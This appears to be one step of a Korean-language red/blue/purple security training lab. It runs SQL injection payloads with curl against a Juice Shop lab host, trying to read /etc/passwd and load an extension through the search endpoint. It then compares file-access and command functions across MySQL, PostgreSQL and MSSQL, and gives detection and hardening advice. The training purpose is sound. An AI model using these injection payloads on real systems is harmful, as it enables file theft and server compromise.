# STEP 10 [RED·SQLi·Advanced·File] — SQLite file I/O 시도 → DBMS 차이 학습
# ============================================================
- order: 10
  instruction: |
    ## 🎯 MISSION

    SQL Injection 으로 *파일 시스템 접근* (서버 완전 장악 시나리오) 가능성 점검.
    Juice Shop (SQLite) 의 `readfile()` / `hex(readfile())` / `load_extension()`
    3 함수 시도 → 모두 실패 응답 직접 확인. 그리고 *MySQL / PostgreSQL / MSSQL*
    의 동등 함수 비교 — DBMS 별 보안 default 차이 학습.

    ## 💻 실행 명령

    ```bash
    # 1. readfile() 시도 (SQLite CLI extension — 일반 빌드는 미지원)
    echo "=== 1. SQLite readfile() ==="
    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20readfile(%27/etc/passwd%27),2,3,4,5,6,7,8,9--" \
      | grep -oE '<title>[^<]*</title>' | head -1

    # 2. hex(readfile()) — 동일 (함수 자체 미존재)
    echo "=== 2. hex(readfile()) ==="
    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--" \
      | grep -oE '<title>[^<]*</title>' | head -1

    # 3. load_extension() — security policy 차단
    echo "=== 3. load_extension() ==="
    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20load_extension(%27/usr/lib/sqlite/ext.so%27),2,3,4,5,6,7,8,9--" \
      | grep -oE '<title>[^<]*</title>' | head -1
    ```

    ## 📋 확인 사항

    - readfile/hex(readfile): `SQLITE_ERROR: no such function: readfile`
      (SQLite 의 일반 빌드는 file extension 미컴파일 — security default)
    - load_extension: `SQLITE_ERROR: not authorized` (SQLITE_ENABLE_LOAD_EXTENSION
      compile flag 비활성 = security default)
    - 결론: **SQLite 의 default 빌드는 SQLi 파일 R/W 불가** (안전)

    ## 💡 왜 이걸 하는가?

    실 공격에서 SQLi 의 *최악 결과* = OS 파일 R/W → web shell upload + RCE
    (MITRE T1190 + T1505.003 Server Software Component: Web Shell). DBMS 별
    *기본 정책* 이 결정 — SQLite 는 default 안전, MySQL / PostgreSQL 은
    설정 의존. 학생은 *DBMS 별 보안 차이* 와 *secure_file_priv* / *FILE
    privilege* 의 의미를 학습.

    DBMS 별 비교 (참조):
    - **MySQL**: `SELECT LOAD_FILE('/etc/passwd')` — FILE privilege + `secure_file_priv`
      = NULL 또는 빈값 필요. default 5.7+ 는 `secure_file_priv=/var/lib/mysql-files/`
      라 OS 파일 R 불가.
    - **MySQL**: `SELECT ... INTO OUTFILE '/tmp/shell.php'` — 동일 제약
    - **PostgreSQL**: `pg_read_file('/etc/passwd')` — superuser 만, default 차단
    - **MSSQL**: `xp_cmdshell` (RCE) — sp_configure 로 비활성 default
    - **SQLite**: file 함수 미컴파일 + load_extension 차단 (위 결과)

    ## 🔵 Blue 측 관찰

    SQLi 의 file R/W 시도는 *DBMS 응답에서 SQLITE_ERROR/not authorized* 또는
    *FILE privilege denied* 형태로 직접 노출 → application log + ModSec audit
    log 의 응답 본문 분석 시 식별. Wazuh rule 100020 (Web SQLi attempt + file
    function) custom 추가 시 alert.

    ## 🟣 Purple 보완 권장

    - **DBMS user privilege 최소화**: web 앱이 사용하는 DB user 의 FILE / SUPERUSER /
      LOAD_EXTENSION privilege 즉시 제거
    - **secure_file_priv** (MySQL) 강제 — 빈값 / NULL 금지, 특정 디렉토리만 허용
    - **OS 단 chroot / AppArmor**: DB process 가 webroot 외부 파일 접근 불가
      (예: /var/lib/mysql 만 RW)
    - **WAF**: ModSecurity CRS rule 942100 + custom rule (LOAD_FILE / INTO OUTFILE /
      pg_read_file / load_extension 키워드 차단)
